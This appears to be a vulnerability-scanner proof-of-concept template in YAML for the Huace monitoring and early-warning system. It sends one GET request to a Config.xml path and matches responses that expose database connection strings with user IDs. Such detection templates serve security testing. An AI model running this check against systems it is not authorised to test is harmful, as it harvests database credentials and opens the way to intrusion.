id: poc-yaml-hc-jian-ce-yu-jing-system-database-leakage
info:
  name: 华测监测预警系统数据库泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: 华测监测预警系统
requests:
- method: GET
  path: /web/Report/Rpt/Config/Config.xml
  expression: status_code == 200 && contains(body,"Database=") && contains(body,"providerName=\"System.Data.SqlClient\"")
    && contains(body,"User Id=") && contains(body,"最近同步时间")
variables: {}
transport: http
